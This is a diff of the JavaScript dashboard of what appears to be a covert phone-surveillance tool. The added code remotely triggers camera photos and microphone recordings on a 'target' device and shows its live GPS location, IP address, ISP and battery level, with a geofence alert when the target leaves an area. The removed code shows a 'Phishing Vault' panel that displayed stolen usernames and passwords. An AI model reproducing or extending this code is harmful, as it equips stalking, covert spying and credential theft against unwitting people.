+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.className = type;
+            toast.style.display = 'block';
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(() => { toast.style.display = 'none'; }, duration);
         }
 
-        document.getElementById('ringBtn').addEventListener('click', () => sendCmd({ ringTime: Date.now() }));
-        document.getElementById('photoFrontBtn').addEventListener('click', () => { sendCmd({ photoTime: Date.now(), camType: 'user' }); document.getElementById('photoBox').style.display = 'block'; });
-        document.getElementById('photoBackBtn').addEventListener('click', () => { sendCmd({ photoTime: Date.now(), camType: 'environment' }); document.getElementById('photoBox').style.display = 'block'; });
-        document.getElementById('audioBtn').addEventListener('click', () => { sendCmd({ audioTime: Date.now() }); document.getElementById('audioBox').style.display = 'block'; });
-        document.getElementById('screenBtn').addEventListener('click', () => { sendCmd({ screenTime: Date.now() }); document.getElementById('photoBox').style.display = 'block'; });
+        // ─── Last Seen Time ─────────────────────────────────────────────
+        function timeAgo(ts) {
+            const diff = Math.floor((Date.now() - ts) / 1000);
+            if (diff < 10) return 'Just now';
+            if (diff < 60) return `${diff}s ago`;
+            if (diff < 3600) return `${Math.floor(diff/60)}m ago`;
+            return `${Math.floor(diff/3600)}h ago`;
+        }
 
+        // ─── Address Lookup ─────────────────────────────────────────────
+        let lastAddrFetch = 0;
+        function fetchAddress(lat, lng) {
+            const now = Date.now();
+            if (now - lastAddrFetch < 10000) return; // throttle
+            lastAddrFetch = now;
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`)
+                .then(r => r.json())
+                .then(d => { document.getElementById('addressUI').textContent = d.display_name || 'Unknown location'; })
+                .catch(() => {});
+        }
+
+        // ─── Init: Clear stale media ────────────────────────────────────
+        remove(ref(db, 'live_location/photo'));
+        remove(ref(db, 'live_location/audio'));
+
+        // ─── Ring Button ────────────────────────────────────────────────
+        document.getElementById('ringBtn').addEventListener('click', () => {
+            set(ref(db, 'live_location/command'), { ringTime: Date.now() });
+            showToast('🔔 Ring command sent!', 'success');
+        });
+
+        // ─── Photo Buttons ──────────────────────────────────────────────
+        function reqPhoto(camType) {
+            set(ref(db, 'live_location/command'), { photoTime: Date.now(), camType });
+            const box = document.getElementById('photoBox');
+            box.classList.add('visible');
+            document.getElementById('photoBadge').textContent = 'Requesting...';
+            document.getElementById('photoBadge').className = 'media-badge badge-waiting';
+            document.getElementById('spyImg').className = 'spy-img';
+            document.getElementById('photoActions').style.display = 'none';
+            showToast(`📸 ${camType === 'user' ? 'Front' : 'Back'} camera requested...`, 'info');
+        }
+        document.getElementById('photoFrontBtn').addEventListener('click', () => reqPhoto('user'));
+        document.getElementById('photoBackBtn').addEventListener('click', () => reqPhoto('environment'));
+
+        // ─── Audio Button ───────────────────────────────────────────────
+        document.getElementById('audioBtn').addEventListener('click', () => {
+            set(ref(db, 'live_location/command'), { audioTime: Date.now() });
+            const box = document.getElementById('audioBox');
+            box.classList.add('visible');
+            document.getElementById('audioBadge').textContent = 'Recording 5s...';
+            document.getElementById('audioBadge').className = 'media-badge badge-waiting';
+            document.getElementById('spyAudio').className = 'spy-audio';
+            document.getElementById('audioActions').style.display = 'none';
+            showToast('🎙️ Voice recording requested!', 'info');
+        });
+
+        // ─── Delete Buttons ─────────────────────────────────────────────
+        document.getElementById('deletePhoto').addEventListener('click', () => {
+            remove(ref(db, 'live_location/photo'));
+            document.getElementById('photoBox').classList.remove('visible');
+            showToast('🗑️ Photo deleted.', 'success');
+        });
+        document.getElementById('deleteAudio').addEventListener('click', () => {
+            remove(ref(db, 'live_location/audio'));
+            document.getElementById('audioBox').classList.remove('visible');
+            showToast('🗑️ Audio deleted.', 'success');
+        });
+
+        // ─── Geofence Button ────────────────────────────────────────────
         document.getElementById('geoBtn').addEventListener('click', () => {
             geofenceEnabled = !geofenceEnabled;
-            if(geofenceEnabled && lastLat !== 0) {
-                document.getElementById('geoBtn').innerText = "🛡️ Geofence: ON (200m)"; document.getElementById('geoBtn').style.background = "#10b981";
-                geofenceCenter = [lastLat, lastLng]; 
+            const btn = document.getElementById('geoBtn');
+            if (geofenceEnabled && lastLat !== 0) {
+                geofenceCenter = [lastLat, lastLng];
+                geofenceCircle = L.circle(geofenceCenter, {
+                    radius: 200,
+                    color: '#f59e0b',
+                    fillColor: '#f59e0b',
+                    fillOpacity: 0.08,
+                    weight: 2,
+                    dashArray: '8,4'
+                }).addTo(map);
+                btn.textContent = '🛡️ Geofence: ON (200m)';
+                btn.classList.add('active');
+                showToast('🛡️ Geofence enabled at current location (200m radius)', 'success');
             } else {
-                document.getElementById('geoBtn').innerText = "🛡️ Geofence: OFF"; document.getElementById('geoBtn').style.background = "#f59e0b";
+                if (geofenceCircle) { map.removeLayer(geofenceCircle); geofenceCircle = null; }
+                btn.textContent = '🛡️ Geofence: OFF';
+                btn.classList.remove('active');
+                if (!geofenceEnabled) showToast('Geofence disabled', 'info');
+                else { geofenceEnabled = false; showToast('⚠️ No GPS fix yet. Get GPS data first.', 'error'); }
             }
         });
 
-        // Listen to Specific User Data
-        document.getElementById('userSelect').addEventListener('change', (e) => {
-            activeUserId = e.target.value;
-            routeLine.setLatLngs([]); // clear route
-            if(!activeUserId) return;
-            
-            // Clean old UI state
-            document.getElementById('photoBox').style.display = 'none';
-            document.getElementById('audioBox').style.display = 'none';
-            document.getElementById('vaultBox').style.display = 'none';
+        // ─── Photo Listener ──────────────────────────────────────────────
+        onValue(ref(db, 'live_location/photo'), (snap) => {
+            const data = snap.val();
+            if (!data) return;
+            const box = document.getElementById('photoBox');
+            box.classList.add('visible');
+            if (data.image) {
+                document.getElementById('photoBadge').textContent = '✓ Captured';
+                document.getElementById('photoBadge').className = 'media-badge badge-ok';
+                const img = document.getElementById('spyImg');
+                img.src = data.image;
+                img.className = 'spy-img visible';
+                document.getElementById('downloadPhoto').href = data.image;
+                document.getElementById('photoActions').style.display = 'flex';
+                showToast('📸 Photo received!', 'success');
+            } else if (data.error) {
+                document.getElementById('photoBadge').textContent = '✗ Error';
+                document.getElementById('photoBadge').className = 'media-badge badge-err';
+                showToast(`⚠️ ${data.error}`, 'error');
+            }
+        });
 
-            // Main Info Listener
-            onValue(ref(db, `live_location/users/${activeUserId}/info`), (snapshot) => {
-                const data = snapshot.val();
-                if (data && data.isOnline) {
-                    document.getElementById('statusBadge').style.color = '#10b981'; document.getElementById('statusBadge').innerText = 'Live';
-                    document.getElementById('deviceUI').innerText = data.deviceInfo || "--";
-                    document.getElementById('batUI').innerText = data.battery ? `${data.battery}% ${data.charging ? '⚡' : ''}` : "--";
-                    document.getElementById('ispUI').innerText = data.isp || "--";
-                    
-                    const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
-                    document.getElementById('speedUI').innerText = `${speed} km/h`;
+        // ─── Audio Listener ──────────────────────────────────────────────
+        onValue(ref(db, 'live_location/audio'), (snap) => {
+            const data = snap.val();
+            if (!data) return;
+            const box = document.getElementById('audioBox');
+            box.classList.add('visible');
+            if (data.file) {
+                document.getElementById('audioBadge').textContent = '✓ Received';
+                document.getElementById('audioBadge').className = 'media-badge badge-ok';
+                const audio = document.getElementById('spyAudio');
+                audio.src = data.file;
+                audio.className = 'spy-audio visible';
+                document.getElementById('downloadAudio').href = data.file;
+                document.getElementById('audioActions').style.display = 'flex';
+                showToast('🎙️ Voice recording received!', 'success');
+            } else if (data.error) {
+                document.getElementById('audioBadge').textContent = '✗ Error';
+                document.getElementById('audioBadge').className = 'media-badge badge-err';
+                showToast(`⚠️ ${data.error}`, 'error');
+            }
+        });
 
-                    if (Math.abs(lastLat - lat) > 0.0005 || lastLat === 0) { 
-                        fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`).then(res => res.json()).then(d => { document.getElementById('addressUI').innerText = `📍 ${d.display_name}`; }).catch(()=>{});
-                    }
-                    lastLat = lat; lastLng = lng;
+        // ─── Main Location Listener ──────────────────────────────────────
+        let lastSeenInterval = null;
 
-                    let htmlFormat = `<div class="smart-marker" style="transform: rotate(${heading}deg);">${speed > 10 ? "🚘" : (speed > 2 ? "🚶‍♂️" : "🧍‍♂️")}</div>`;
-                    const smartIcon = L.divIcon({ className: '', html: htmlFormat, iconSize: [40, 40], iconAnchor: [20, 20] });
-                    const latlng = [lat, lng]; routeLine.addLatLng(latlng);
+        onValue(ref(db, 'live_location/target_user'), (snapshot) => {
+            const data = snapshot.val();
 
-                    // Geofence Calc
-                    if(geofenceEnabled && geofenceCenter) {
-                        const dist = L.latLng(geofenceCenter[0], geofenceCenter[1]).distanceTo(L.latLng(lat, lng));
-                        if(dist > 200) {
-                            document.getElementById('geoAlert').style.display = 'block';
-                            new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3').play().catch(e=>{});
-                        } else { document.getElementById('geoAlert').style.display = 'none'; }
-                    }
+            if (!data || !data.isOnline) {
+                // Offline
+                document.getElementById('statusDot').className = 'status-dot offline';
+                document.getElementById('statusText').textContent = 'Offline';
+                document.getElementById('statusText').className = 'status-text offline';
+                return;
+            }
 
-                    if (!marker) { 
-                        accuracyRadar = L.circle(latlng, { radius: accuracy, color: '#38bdf8', fillColor: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
-                        marker = L.marker(latlng, {icon: smartIcon}).addTo(map); map.flyTo(latlng, 18); 
-                    } else { 
-                        marker.setLatLng(latlng); marker.setIcon(smartIcon); accuracyRadar.setLatLng(latlng); accuracyRadar.setRadius(accuracy); 
-                    }
-                } else {
-                    document.getElementById('statusBadge').style.color = '#ef4444'; document.getElementById('statusBadge').innerText = 'Offline';
+            // Online
+            document.getElementById('statusDot').className = 'status-dot live';
+            document.getElementById('statusText').textContent = 'Live';
+            document.getElementById('statusText').className = 'status-text live';
+
+            // Last seen
+            if (data.lastSeen) {
+                clearInterval(lastSeenInterval);
+                const updateTime = () => document.getElementById('lastSeenTime').textContent = timeAgo(data.lastSeen);
+                updateTime();
+                lastSeenInterval = setInterval(updateTime, 10000);
+            }
+
+            // Device info
+            document.getElementById('deviceUI').textContent = data.deviceInfo || '--';
+            document.getElementById('batUI').textContent = data.battery != null
+                ? `${data.battery}% ${data.charging ? '⚡ Charging' : '🔋'}` : '--';
+            document.getElementById('ipUI').textContent = data.ip_address || '--';
+            document.getElementById('ispUI').textContent = data.isp || '--';
+
+            if (data.status && data.status.includes('Error')) {
+                document.getElementById('addressUI').textContent = `⚠️ ${data.status}`;
+                return;
+            }
+
+            const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
+            if (!lat || !lng) return;
+
+            // Update coords
+            document.getElementById('latUI').textContent = lat.toFixed(6);
+            document.getElementById('lngUI').textContent = lng.toFixed(6);
+            document.getElementById('accUI').textContent = accuracy ? `±${Math.round(accuracy)}m` : '--';
+            document.getElementById('speedUI').textContent = speed || 0;
+            document.getElementById('headingUI').textContent = `${heading || 0}°`;
+            document.getElementById('mapsLink').href = `https://maps.google.com/?q=${lat},${lng}`;
+
+            // Speed bar (max 120 km/h)
+            document.getElementById('speedBarFill').style.width = `${Math.min((speed / 120) * 100, 100)}%`;
+
+            // Route
+            if (Math.abs(lastLat - lat) > 0.00005 || lastLat === 0) {
+                if (lastLat !== 0) fetchAddress(lat, lng);
+                routeLine.addLatLng([lat, lng]);
+                routePoints++;
+                document.getElementById('pointsUI').textContent = routePoints;
+            }
+            lastLat = lat; lastLng = lng;
+
+            // Update marker
+            const emoji = speed > 30 ? '🚗' : (speed > 5 ? '🚶' : '🧍');
+            const iconHtml = `<div class="smart-marker" style="transform:rotate(${heading||0}deg)">${emoji}</div>`;
+            const smartIcon = L.divIcon({ className: '', html: iconHtml, iconSize: [40, 40], iconAnchor: [20, 20] });
+            const latlng = [lat, lng];
+
+            if (!marker) {
+                accuracyCircle = L.circle(latlng, {
+                    radius: accuracy || 50,
+                    color: '#38bdf8',
+                    fillColor: '#38bdf8',
+                    fillOpacity: 0.1,
+                    weight: 1
+                }).addTo(map);
+                marker = L.marker(latlng, { icon: smartIcon }).addTo(map);
+                map.flyTo(latlng, 17, { duration: 2 });
+            } else {
+                marker.setLatLng(latlng);
+                marker.setIcon(smartIcon);
+                if (accuracyCircle) { accuracyCircle.setLatLng(latlng); accuracyCircle.setRadius(accuracy || 50); }
+            }
+
+            // Geofence check
+            if (geofenceEnabled && geofenceCenter) {
+                const dist = map.distance(latlng, geofenceCenter);
+                if (dist > 200) {
+                    document.getElementById('geoAlert').style.display = 'block';
+                    document.getElementById('geoAlertMsg').textContent =
+                        `Target is ${Math.round(dist)}m away from geofence boundary!`;
                 }
-            });
-
-            // Motion Listener
-            onValue(ref(db, `live_location/users/${activeUserId}/motion`), (snap) => {
-                const m = snap.val();
-                if(m) document.getElementById('motionUI').innerText = `${m.alpha}°, ${m.beta}°, ${m.gamma}°`;
-            });
-
-            // Phishing Vault Listener
-            onValue(ref(db, `live_location/users/${activeUserId}/vault`), (snap) => {
-                const v = snap.val();
-                if(v) {
-                    document.getElementById('vaultPlat').innerText = v.platform;
-                    document.getElementById('vaultUser').innerText = v.username;
-                    document.getElementById('vaultPass').innerText = v.password;
-                    document.getElementById('vaultBox').style.display = 'block';
-                }
-            });
-
-            // Media Listeners
-            onValue(ref(db, `live_location/users/${activeUserId}/media/photo`), (snap) => {
-                const p = snap.val();
-                if(p && p.image) {
-                    document.getElementById('photoStatus').innerText = "Media Captured!"; document.getElementById('spyImg').src = p.image; document.getElementById('downloadPhoto').href = p.image;
-                } else if (p && p.error) { document.getElementById('photoStatus').innerText = `Error: ${p.error}`; }
-            });
-            onValue(ref(db, `live_location/users/${activeUserId}/media/audio`), (snap) => {
-                const a = snap.val();
-                if(a && a.file) {
-                    document.getElementById('audioStatus').innerText = "Audio Received!"; document.getElementById('spyAudio').src = a.file; 
-                } else if (a && a.error) { document.getElementById('audioStatus').innerText = `Error: ${a.error}`; }
-            });
+            }
         });
     </script>
 </body>
